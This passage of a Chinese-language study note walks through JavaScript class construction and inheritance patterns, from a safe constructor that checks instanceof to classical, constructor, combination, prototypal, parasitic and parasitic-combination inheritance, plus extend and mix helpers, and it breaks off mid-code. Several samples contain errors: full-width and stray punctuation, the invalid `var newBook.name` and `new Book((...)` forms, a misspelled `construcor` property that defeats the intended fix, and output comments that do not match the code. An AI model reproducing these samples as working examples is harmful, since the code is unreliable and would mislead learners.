punctuation">)</span>        <span class="token comment" spellcheck="true">//构造器</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setPrice</span><span class="token punctuation">(</span>price<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//构造原型</span>    _book<span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//静态公有属性</span>        isJSBook<span class="token punctuation">:</span><span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">//静态公有方法</span>        display<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//返回类</span>    <span class="token keyword">return</span> _book；<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="创建对象的安全模式"><a href="#创建对象的安全模式" class="headerlink" title="创建对象的安全模式"></a>创建对象的安全模式</h1><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> Book <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span>time<span class="token punctuation">,</span>type<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>title <span class="token operator">=</span> title<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>time <span class="token operator">=</span> time<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//实例化一本书</span><span class="token keyword">var</span> book <span class="token operator">=</span> <span class="token function">Book</span><span class="token punctuation">(</span><span class="token string">'JavaScript'</span><span class="token punctuation">,</span><span class="token string">'2014'</span><span class="token punctuation">,</span><span class="token string">'js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//测试</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>book<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//undefined</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>title<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//JavaScript</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//2014</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//js</span></code></pre><p><strong>new关键字的作用可以看作是对当前对象的this不停地赋值</strong></p><p>例子中没有new，则会直接执行这个函数</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//图书安全类</span><span class="token keyword">var</span> Book <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span>time<span class="token punctuation">,</span>type<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//判断执行过程中this是否是当前这个对象（如果是说明是用new创建的）</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token keyword">instanceof</span> <span class="token class-name">Book</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>title <span class="token operator">=</span> title<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>time <span class="token operator">=</span> time<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Book</span><span class="token punctuation">(</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span>time<span class="token punctuation">,</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//测试</span><span class="token keyword">var</span> book <span class="token operator">=</span> <span class="token function">Book</span><span class="token punctuation">(</span><span class="token string">'JavaScript'</span><span class="token punctuation">,</span><span class="token string">'2014'</span><span class="token punctuation">,</span><span class="token string">'js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><h2 id="类式继承"><a href="#类式继承" class="headerlink" title="类式继承"></a>类式继承</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//声明父类</span><span class="token keyword">function</span> <span class="token function">SuperClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>superValue <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//为父类添加共有方法</span>SuperClass<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>getSuperValue <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>superValue<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//声明子类</span><span class="token keyword">function</span> <span class="token function">SubClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>subValue <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//继承父类</span>SubClass<span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SuperClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span>'<span class="token comment" spellcheck="true">//为子类添加共有方法</span>SubClass<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>getSubValue <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>subValue<span class="token punctuation">;</span><span class="token punctuation">}</span>'<span class="token comment" spellcheck="true">//测试</span><span class="token keyword">var</span> instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SubClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>instance<span class="token punctuation">.</span>getSubValue<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>instance<span class="token punctuation">.</span>getSuperValue<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//true</span></code></pre><p><strong>instanceof 可以检测某个对象是否是某个类的实例</strong></p><pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>instance <span class="token keyword">instanceof</span> <span class="token class-name">SuperClass</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>instance <span class="token keyword">instanceof</span> <span class="token class-name">SubClass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>SubClass <span class="token keyword">instanceof</span> <span class="token class-name">SuperClass</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>SubClass<span class="token punctuation">.</span>prototype <span class="token keyword">instanceof</span> <span class="token class-name">SuperClass</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//true</span><span class="token comment" spellcheck="true">//所有创建的对象都是原生对象Object的实例</span></code></pre><p>缺点：</p><ol><li><p>父类中的共有属性要是引用类型，就会在子类中被所有实例共用</p></li><li><p>由于子类实现的继承是靠原型对父类的实例化实现的，因此在创建父类的时候，是无法向父类传递参数的，因而在实例化父类的时候也无法对父类构造函数内的属性进行初始化。</p></li></ol><h2 id="构造函数继承"><a href="#构造函数继承" class="headerlink" title="构造函数继承"></a>构造函数继承</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//声明父类</span><span class="token keyword">function</span> <span class="token function">SuperClass</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//引用类型共有属性</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>books <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'JavaScript'</span><span class="token punctuation">,</span><span class="token string">'html'</span><span class="token punctuation">,</span><span class="token string">'css'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//值类型共有属性</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//父类声明原型方法</span>SuperClass<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>showBooks <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>books<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//声明子类</span><span class="token keyword">function</span> <span class="token function">SubClass</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//继承父类</span>    SuperClass<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//创建第一个子类的实例</span><span class="token keyword">var</span> instance1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SubClass</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建第二个子类的实例</span><span class="token keyword">var</span> instance2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SubClass</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>instance1<span class="token punctuation">.</span>books<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'设计模式'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>instance1<span class="token punctuation">.</span>books<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//['JavaScript','html','css','设计模式']</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>instance1<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//10</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>instance2<span class="token punctuation">.</span>books<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//['JavaScript','html','css']</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>instance2<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//11</span>instance1<span class="token punctuation">.</span><span class="token function">showBooks</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//TypeError</span></code></pre><p>SuperClass.call(this,id);这条语句是构造函数继承的精华，由于call这个方法可以更改函数的作用环境，因此在子类中，对superClass调用这个方法就是将子类中的变量在父类中执行一遍，由于父类中是给this绑定属性的，因此子类继承了父类的共有属性。</p><p>缺点：父类的原型方法不会被子类继承，如果要被继承必须放在构造函数中，这样创建出来的每个实例都会单独拥有一份而不能共有，违反了代码复用的原则在</p><h2 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h2><ul><li>类式继承是通过子类的原型对父类实例化来实现的</li><li>构造函数式继承是通过在子类的构造函数作用环境中执行一次父类的构造函数来实现的</li><li>组合继承同时实现这两点</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//声明父类</span><span class="token keyword">function</span> <span class="token function">SuperClass</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//引用类型共有属性</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>books <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'JavaScript'</span><span class="token punctuation">,</span><span class="token string">'html'</span><span class="token punctuation">,</span><span class="token string">'css'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//值类型共有属性</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//父类声明原型方法</span>SuperClass<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>getName <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//声明子类</span><span class="token keyword">function</span> <span class="token function">SubClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>time<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//构造函数继承父类name属性</span>    SuperClass<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//类式继承 </span>SubClass<span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SuperClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//子类原型方法</span>SubClass<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>getTime <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>time<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//测试</span><span class="token keyword">var</span> instance1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SubClass</span><span class="token punctuation">(</span><span class="token string">'js book'</span><span class="token punctuation">,</span><span class="token number">2014</span><span class="token punctuation">)</span><span class="token punctuation">;</span>instance1<span class="token punctuation">.</span>books<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'设计模式'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>instance1<span class="token punctuation">.</span>books<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//['JavaScript','html','css','设计模式']</span>instance1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//js book</span>instance1<span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//2014</span><span class="token keyword">var</span> instance2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SubClass</span><span class="token punctuation">(</span><span class="token string">'css book'</span><span class="token punctuation">,</span><span class="token number">2013</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>instance1<span class="token punctuation">.</span>books<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//['JavaScript','html','css']</span>instance1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//css book</span>instance1<span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//2013</span></code></pre><p>缺点：</p><ol><li>使用构造函数继承时执行了一遍父类的构造函数，而在实现子类原型的类式继承时又调用了一遍父类构造函数，因此父类构造函数调用了两遍。</li></ol><h2 id="原型式继承"><a href="#原型式继承" class="headerlink" title="原型式继承"></a>原型式继承</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//这是对类式继承的封装，其中的过渡对象就相当于类式继承中的子类</span><span class="token keyword">function</span> <span class="token function">inheritObkect</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//声明一个过渡函数对象</span>    <span class="token keyword">function</span> <span class="token function">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//过渡对象的原型继承父对象</span>    F<span class="token punctuation">.</span>prototype <span class="token operator">=</span> o<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//返回过渡对象的一个实例，该实例的原型继承了父对象</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> book <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">'js book'</span><span class="token punctuation">,</span>    alikeBook<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'css book'</span><span class="token punctuation">,</span><span class="token string">'html book'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">var</span> newBook <span class="token operator">=</span> <span class="token function">inheritObkect</span><span class="token punctuation">(</span>book<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> newBook<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'ajax book'</span></code></pre><p>这种方式由于F过渡类中的构造函数无内容，所以开销比较小。</p><p>缺点：仍然存在类式继承的缺点</p><h2 id="寄生式继承"><a href="#寄生式继承" class="headerlink" title="寄生式继承"></a>寄生式继承</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> book <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">'js book'</span><span class="token punctuation">,</span>    alikeBook<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'css book'</span><span class="token punctuation">,</span><span class="token string">'html book'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">createBook</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//通过原型继承方式创建新对象</span>    <span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">inheritObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//拓展新对象</span>    o<span class="token punctuation">.</span>getName <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//返回拓展后的新对象</span>    <span class="token keyword">return</span> o<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>寄生式继承就是对原型继承的第二次封装，并且在这第二次封装过程中对继承的对象进行了拓展，这样新创建的对象不仅仅有父类中的属性和方法而且还添加新的属性和方法</p><h2 id="寄生组合式继承"><a href="#寄生组合式继承" class="headerlink" title="寄生组合式继承"></a>寄生组合式继承</h2><p>寄生式继承依托于原型继承，原型继承又与类式继承相像。</p><p>寄生组合式继承是寄生式继承和构造函数继承两种模式的组合，也是对组合继承的改进。</p><p>组合继承 = 类式继承+构造函数继承（子类不是父类的实例，而子类的原型是父类的实例）</p><p>寄生组合式继承= 寄生式继承+构造函数继承</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">inheritPrototype</span><span class="token punctuation">(</span>subClass<span class="token punctuation">,</span>superClass<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//复制一份父类的原型副本保存在变量中</span>    <span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token function">inheritObject</span><span class="token punctuation">(</span>superClass<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//修正因为重写子类原型导致子类的constructor属性被修改</span>    p<span class="token punctuation">.</span>construcor <span class="token operator">=</span> subClass<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//设置子类的原型</span>    subClass<span class="token punctuation">.</span>prototype <span class="token operator">=</span> p<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>组合式继承中，通过构造函数继承的属性和方法是没有问题的，所以我们主要探究通过寄生式继承重新继承父类的原型。在构造函数继承中我们已经调用了父类的构造函数。因此我们需要的就是父类的原型对象的一个副本，这个副本我们通过原型继承便可得到，但是这个复制对象p中的construstor指向的不是subClass，因此在寄生式继承中要对p做一次增强，修复其construstor指向不正确的问题，再赋给子类的原型。</p><pre class=" language-js"><code class="language-js">        <span class="token comment" spellcheck="true">//定义父类</span>        <span class="token keyword">function</span> <span class="token function">SuperClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>colors <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'red'</span><span class="token punctuation">,</span><span class="token string">'blue'</span><span class="token punctuation">,</span><span class="token string">'green'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//定义父类原型方法</span>        SuperClass<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>getName <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//定义子类</span>        <span class="token keyword">function</span> <span class="token function">SubClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>time<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//构造函数式继承</span>            SuperClass<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//子类新增属性</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>time <span class="token operator">=</span> time<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//寄生式继承父类原型</span>        <span class="token function">inheritPrototype</span><span class="token punctuation">(</span>SubClass<span class="token punctuation">,</span>SuperClass<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//子类新增原型方法</span>        SubClass<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>getTime <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//测试</span>        <span class="token keyword">var</span> instance1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SubClass</span><span class="token punctuation">(</span><span class="token string">'js book'</span><span class="token punctuation">,</span><span class="token number">2014</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> instance2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SubClass</span><span class="token punctuation">(</span><span class="token string">'css book'</span><span class="token punctuation">,</span><span class="token number">2013</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        instance1<span class="token punctuation">.</span>colors<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'black'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>instance1<span class="token punctuation">.</span>colors<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//["red", "blue", "green", "black"]</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>instance2<span class="token punctuation">.</span>colors<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//["red", "blue", "green"]</span>        instance2<span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//2013</span>        instance2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//css book</span></code></pre><h2 id="继承单对象属性的extend方法"><a href="#继承单对象属性的extend方法" class="headerlink" title="继承单对象属性的extend方法"></a>继承单对象属性的extend方法</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//单继承 属性复制</span><span class="token keyword">var</span> extend <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span>source<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//遍历源对象中的属性</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> property <span class="token keyword">in</span> source<span class="token punctuation">)</span><span class="token punctuation">{</span>        target<span class="token punctuation">[</span>property<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>property<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//返回目标对象</span>    <span class="token keyword">return</span> target<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> mix <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>                    <span class="token comment" spellcheck="true">//从第二个参数起为被继承的对象</span>        len <span class="token operator">=</span> arguments<span class="token punctuation">.</span>length<span class="token punctuation">,</span>   <span class="token comment" spellcheck="true">//获取参数长度</span>        target <span class="token operator">=</span> arguments<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">//第一个对象为目标对象</span>        arg<span class="token punctuation">;</span>                      <span class="token comment" spellcheck="true">//缓存参数对象</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        arg <span class="token operator">=</span> arguments<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> property <span class="token keyword">in</span> arg<span class="token punctuation">)</span><span class="token punctuation">{</span>            target<span class="token punctuation">[</span>property<span class="token punctuation">]</span> <span class="token operator">=</span> arg<span class="token punctuation">[</span>property<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> target<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>我们也可以将它绑定到原生对象Object上，这样所有的对象就可以拥有这个方法了。</p><pre class=" language-js"><code class="language-js">Object<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>mix <span class="token operator">=</span> <span class="token keyword">function</span><span 